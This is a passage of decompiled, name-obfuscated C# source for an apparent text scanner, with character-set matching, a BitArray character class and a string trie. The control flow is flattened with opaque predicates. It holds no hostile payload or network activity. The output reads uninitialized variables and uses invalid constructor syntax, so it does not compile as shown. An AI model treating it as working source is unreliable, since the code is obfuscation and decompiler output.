      num2 = 1;
      if (SV.cb7() != null)
      {
        int num3;
        num2 = num3;
        goto label_1;
      }
      else
        goto label_1;
    }

    public bool pkP(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6,
      char _param7)
    {
      if (this.tGM < this.SG0)
        goto label_6;
label_5:
      return false;
label_6:
      char ch = SV.LbI((object) this.Mkc, this.tGM);
      if ((int) ch == (int) _param1)
        goto label_11;
      else
        goto label_9;
label_1:
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          ++this.tGM;
          return true;
        case 2:
          if ((int) ch != (int) _param2 && (int) ch != (int) _param3 && (int) ch != (int) _param4 && (int) ch != (int) _param5 && (int) ch != (int) _param6)
          {
            num1 = (int) ch == (int) _param7 ? 1 : 0;
            goto label_12;
          }
          else
            goto label_11;
      }
label_4:
      goto label_5;
label_9:
      num2 = 2;
      goto label_1;
label_11:
      num1 = 1;
label_12:
      if (num1 != 0)
      {
        num2 = 1;
        if (SV.cb7() != null)
        {
          int num3;
          num2 = num3;
          goto label_1;
        }
        else
          goto label_1;
      }
      else
        goto label_4;
    }

    public bool gkJ(
      char _param1,
      char _param2,
      char _param3,
      char _param4,
      char _param5,
      char _param6,
      char _param7,
      char _param8)
    {
      if (this.tGM >= this.SG0)
        goto label_7;
      else
        goto label_3;
label_1:
      int num1;
      int num2 = num1;
label_2:
      char ch;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 2:
            goto label_8;
          case 3:
            if ((int) ch != (int) _param4 && (int) ch != (int) _param5)
            {
              if (SV.kbt())
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_13;
          default:
            goto label_12;
        }
      }
label_12:
      int num3;
      if ((int) ch != (int) _param6 && (int) ch != (int) _param7)
      {
        num3 = (int) ch == (int) _param8 ? 1 : 0;
        goto label_14;
      }
      else
        goto label_13;
label_3:
      ch = this.Mkc[this.tGM];
      if ((int) ch != (int) _param1 && (int) ch != (int) _param2 && (int) ch != (int) _param3)
      {
        num2 = SV.cb7() != null ? 0 : 3;
        goto label_2;
      }
      else
        goto label_13;
label_7:
      bool flag = false;
      num2 = 1;
      if (SV.kbt())
        goto label_2;
      else
        goto label_1;
label_8:
      return flag;
label_13:
      num3 = 1;
label_14:
      if (num3 != 0)
      {
        ++this.tGM;
        flag = true;
        goto label_8;
      }
      else
        goto label_7;
    }

    public bool Nkw(string _param1)
    {
      bool flag;
      if (this.tGM < this.SG0)
      {
        int num1 = 1;
        if (SV.cb7() != null)
          goto label_3;
label_1:
        switch (num1)
        {
          case 1:
            if (_param1.IndexOf(this.Mkc[this.tGM]) != -1)
            {
              ++this.tGM;
              flag = true;
              goto label_4;
            }
            else
              goto label_5;
          default:
            goto label_4;
        }
label_3:
        int num2;
        num1 = num2;
        goto label_1;
      }
      else
        goto label_5;
label_4:
      return flag;
label_5:
      flag = false;
      goto label_4;
    }

    public bool xkq(string _param1)
    {
      bool flag;
      if (this.tGM >= this.SG0 || _param1.IndexOf(this.Mkc[this.tGM]) != -1)
        flag = false;
      else
        goto label_5;
label_4:
      return flag;
label_5:
      ++this.tGM;
      int num1 = 1;
      if (SV.cb7() != null)
        goto label_6;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            flag = true;
            num1 = !SV.kbt() ? 0 : 0;
            continue;
          default:
            goto label_4;
        }
      }
label_6:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public bool bkZ(SV.zGb _param1)
    {
      bool flag;
      if (this.tGM < this.SG0 && _param1.VNG(this.Mkc[this.tGM]))
      {
        int num1 = 0;
        if (!SV.kbt())
          goto label_3;
label_1:
        switch (num1)
        {
          case 1:
            goto label_5;
          default:
            ++this.tGM;
            flag = true;
            goto label_5;
        }
label_3:
        int num2;
        num1 = num2;
        goto label_1;
      }
      else
        flag = false;
label_5:
      return flag;
    }

    public bool sk5(SV.FG3 _param1)
    {
      int num1 = 6;
label_1:
      int num2 = num1;
      while (true)
      {
        int num3;
        int tGm;
        SV.FG3.SGl iNa;
        char ch;
        switch (num2)
        {
          case 1:
            if (iNa.nN9 != null && (int) ch >= (int) iNa.uNj && (int) ch <= (int) iNa.uNj + iNa.nN9.Length - 1 && iNa.nN9[(int) ch - (int) iNa.uNj] != null)
            {
              iNa = iNa.nN9[(int) ch - (int) iNa.uNj];
              ++tGm;
              break;
            }
            goto label_14;
          case 2:
            goto label_10;
          case 3:
            ch = this.Mkc[tGm];
            if (SV.cb7() == null)
            {
              num2 = 1;
              continue;
            }
            goto label_1;
          case 4:
            goto label_3;
          case 5:
            num3 = this.tGM - 1;
            tGm = this.tGM;
            break;
          case 6:
            iNa = _param1.iNa;
            num2 = 5;
            continue;
          default:
label_7:
            if (iNa.VNm)
            {
              num3 = tGm;
              num2 = 3;
              continue;
            }
            goto case 3;
        }
        if (tGm < this.SG0)
          goto label_7;
label_14:
        if (num3 >= this.tGM)
        {
          this.tGM = num3;
          num2 = 4;
        }
        else
          num2 = 2;
      }
label_3:
      return true;
label_10:
      return false;
    }

    internal static void ybR() => XTG.fvQjdC();

    internal static bool kbt() => SV.ybD == null;

    internal static SV cb7() => SV.ybD;

    internal static object Dbe([In] object obj0, [In] object obj1, [In] object obj2, [In] object obj3) => (object) ((string) obj0 + (string) obj1 + (string) obj2 + (string) obj3);

    internal static object XbF([In] object obj0, [In] int obj1, [In] int obj2) => (object) ((string) obj0).Substring(obj1, obj2);

    internal static void pbh([In] object obj0, [In] object obj1, [In] object obj2) => ((TextWriter) obj0).WriteLine((string) obj1, (object[]) obj2);

    internal static char LbI([In] object obj0, [In] int obj1) => ((string) obj0)[obj1];

    internal static char bbA([In] char obj0) => char.ToUpper(obj0);

    internal static int Pbc([In] object obj0) => ((string) obj0).Length;

    public sealed class zGb
    {
      private BitArray DNT;
      private bool zNk;
      internal static SV.zGb QZE;

      public zGb(BitArray _param1)
      {
        XTG.fvQjdC();
        // ISSUE: explicit constructor call
        this.\u002Ector(_param1, false);
      }

      public zGb(BitArray _param1, bool _param2)
      {
        XTG.fvQjdC();
        // ISSUE: explicit constructor call
        base.\u002Ector();
        this.DNT = new BitArray(_param1);
        this.zNk = _param2;
      }

      public zGb(SV.zGb.fG6[] _param1, char[] _param2)
      {
        SV.zGb.mZj();
        // ISSUE: explicit constructor call
        this.\u002Ector(_param1, _param2, false);
      }

      public zGb(SV.zGb.fG6[] _param1, char[] _param2, bool _param3)
      {
        XTG.fvQjdC();
        // ISSUE: explicit constructor call
        base.\u002Ector();
        int num1 = 0;
        bool flag1 = _param1 != null;
        int num2 = 7;
        if (true)
          goto label_2;
label_1:
        int num3;
        num2 = num3;
label_2:
        while (true)
        {
          char[] chArray1;
          int index1;
          int num4;
          int index2;
          SV.zGb.fG6[] fG6Array;
          int index3;
          SV.zGb.fG6 fG6_1;
          char[] chArray2;
          int index4;
          bool flag2;
          bool flag3;
          switch (num2)
          {
            case 1:
              if (flag3)
              {
                num1 = num4;
                num2 = 3;
                continue;
              }
              goto case 3;
            case 2:
label_35:
              if (index1 < chArray1.Length)
              {
                num4 = (int) chArray1[index1];
                flag3 = num4 > num1;
                if (true)
                {
                  num2 = 1;
                  continue;
                }
                goto label_1;
              }
              else
              {
                if (true)
                {
                  num2 = 5;
                  continue;
                }
                goto label_1;
              }
            case 3:
              ++index1;
              num2 = false ? 2 : 2;
              continue;
            case 4:
              num1 = (int) fG6_1.TNF;
              break;
            case 5:
label_16:
              this.DNT = new BitArray(num1 + 1, false);
              if (_param1 != null)
              {
                foreach (SV.zGb.fG6 fG6_2 in _param1)
                {
                  for (int eNf = (int) fG6_2.eNf; eNf <= (int) fG6_2.TNF; ++eNf)
                    SV.zGb.tZS((object) this.DNT, eNf, true);
                }
                if (true)
                {
                  num2 = 8;
                  continue;
                }
                goto label_1;
              }
              else
                goto case 8;
            case 6:
label_17:
              index3 = (int) chArray2[index4];
              if (true)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            case 7:
              if (flag1)
              {
                fG6Array = _param1;
                index2 = 0;
                goto label_29;
              }
              else
                goto label_12;
            case 8:
              if (_param2 != null)
              {
                chArray2 = _param2;
                index4 = 0;
                goto label_31;
              }
              else
                goto label_5;
            case 9:
label_34:
              fG6_1 = fG6Array[index2];
              flag2 = (int) fG6_1.TNF > num1;
              num2 = 10;
              continue;
            case 10:
              if (flag2)
              {
                num2 = 4;
                continue;
              }
              break;
            default:
              this.DNT[index3] = true;
              ++index4;
              goto label_31;
          }
          ++index2;
          goto label_29;
label_12:
          if (_param2 != null)
          {
            chArray1 = _param2;
            index1 = 0;
            goto label_35;
          }
          else
            goto label_16;
label_29:
          if (index2 < fG6Array.Length)
            goto label_34;
          else
            goto label_12;
label_31:
          if (index4 < chArray2.Length)
            goto label_17;
          else
            break;
        }
label_5:
        this.zNk = _param3;
      }

      public bool VNG(char _param1)
      {
        int num1 = 1;
label_1:
        int num2 = num1;
        bool flag;
        bool zNk;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 1:
              if ((int) _param1 < this.DNT.Length)
              {
                if (SV.zGb.bZf() == null)
                {
                  num2 = 0;
                  continue;
                }
                goto label_1;
              }
              else
              {
                num3 = 0;
                break;
              }
            case 2:
              goto label_7;
            default:
              num3 = this.DNT[(int) _param1] ? 1 : 0;
              break;
          }
          flag = num3 != 0;
          zNk = this.zNk;
          if (SV.zGb.bZf() == null)
            num2 = 2;
          else
            goto label_1;
        }
label_7:
        return !zNk ? flag : !flag;
      }

      internal static bool nZ0() => SV.zGb.QZE == null;

      internal static SV.zGb bZf() => SV.zGb.QZE;

      internal static void mZj() => XTG.fvQjdC();

      internal static void tZS([In] object obj0, [In] int obj1, [In] bool obj2) => ((BitArray) obj0)[obj1] = obj2;

      public struct fG6
      {
        public char eNf;
        public char TNF;
        private static object IZa;

        public fG6(char _param1, char _param2)
        {
          XTG.fvQjdC();
          this.eNf = _param1;
          this.TNF = _param2;
        }

        internal static bool YZW() => SV.zGb.fG6.IZa == null;

        internal static object tZY() => SV.zGb.fG6.IZa;
      }
    }

    public sealed class FG3
    {
      internal SV.FG3.SGl iNa;
      internal static SV.FG3 DZL;

      public FG3(string[] _param1)
      {
        XTG.fvQjdC();
        // ISSUE: explicit constructor call
        base.\u002Ector();
        this.iNa = new SV.FG3.SGl(char.MinValue, 0, _param1);
      }

      internal static bool iZk() => SV.FG3.DZL == null;

      internal static SV.FG3 pZx() => SV.FG3.DZL;

      internal class SGl
      {
        internal char gNy;
        internal bool VNm;
        internal char uNj;
        internal SV.FG3.SGl[] nN9;
        private static SV.FG3.SGl VZT;

        internal SGl(char _param1, int _param2, string[] _param3)
        {
          XTG.fvQjdC();
          // ISSUE: explicit constructor call
          base.\u002Ector();
          this.gNy = _param1;
          char ch1 = char.MinValue;
          this.uNj = char.MaxValue;
          HashSet<char> charSet = new HashSet<char>();
          int num1 = 3;
          while (true)
          {
            char ch2;
            string str;
            int index;
            bool flag1;
            string[] strArray;
            bool flag2;
            switch (num1)
            {
              case 1:
                goto label_35;
              case 2:
                if (flag2)
                  this.uNj = ch2;
                if ((int) ch2 > (int) ch1)
                {
                  num1 = 4;
                  continue;
                }
                goto label_5;
              case 3:
                strArray = _param3;
                index = 0;
                goto label_39;
              case 4:
                ch1 = ch2;
                goto label_5;
              case 5:
                if (!flag1)
                {
                  if (_param2 != str.Length)
                  {
                    ch2 = str[_param2];
                    charSet.Add(ch2);
                    flag2 = (int) ch2 < (int) this.uNj;
                    if (true)
                    {
                      num1 = 2;
                      continue;
                    }
                    break;
                  }
                  this.VNm = true;
                  goto label_6;
                }
                else
                  goto label_6;
              case 6:
                goto label_37;
              case 7:
                flag1 = str == null || _param2 > str.Length;
                num1 = 5;
                continue;
              default:
label_28:
                str = strArray[index];
                if (true)
                {
                  num1 = 7;
                  continue;
                }
                break;
            }
label_1:
            int num2;
            num1 = num2;
            continue;
label_5:
label_6:
            ++index;
label_39:
            if (index >= strArray.Length)
            {
              if (charSet.Count == 0)
              {
                if (true)
                  num1 = 1;
                else
                  goto label_1;
              }
              else
                break;
            }
            else
              goto label_28;
          }
          this.nN9 = new SV.FG3.SGl[(int) ch1 - (int) this.uNj + 1];
          using (HashSet<char>.Enumerator enumerator = charSet.GetEnumerator())
          {
            while (enumerator.MoveNext())
            {
              char current = enumerator.Current;
              int num3 = 2;
              if (false)
                goto label_20;
label_14:
              List<string> stringList;
              while (true)
              {
                string str;
                string[] strArray;
                int index;
                switch (num3)
                {
                  case 1:
                    if (_param2 < str.Length && (int) current == (int) SV.FG3.SGl.LGb((object) str, _param2))
                      goto label_24;
label_18:
                    ++index;
                    goto default;
label_24:
                    stringList.Add(str);
                    goto label_18;
                  case 2:
                    stringList = new List<string>();
                    strArray = _param3;
                    index = 0;
                    if (true)
                    {
                      num3 = 0;
                      continue;
                    }
                    break;
                  default:
                    if (index < strArray.Length)
                    {
                      str = strArray[index];
                      if (true)
                      {
                        num3 = 1;
                        continue;
                      }
                      break;
                    }
                    goto label_17;
                }
                int num4;
                num3 = num4;
              }
label_17:
              this.nN9[(int) current - (int) this.uNj] = new SV.FG3.SGl(current, _param2 + 1, stringList.ToArray());
              continue;
label_20:
              num3 = 2;
              goto label_14;
            }
            goto label_37;
          }
label_35:
          this.nN9 = (SV.FG3.SGl[]) null;
          return;
label_37:;
        }

        internal static char LGb([In] object obj0, [In] int obj1) => ((string) obj0)[obj1];

        internal static bool wZz() => SV.FG3.SGl.VZT == null;

        internal static SV.FG3.SGl KG6() => SV.FG3.SGl.VZT;
      }
    }
  }
}
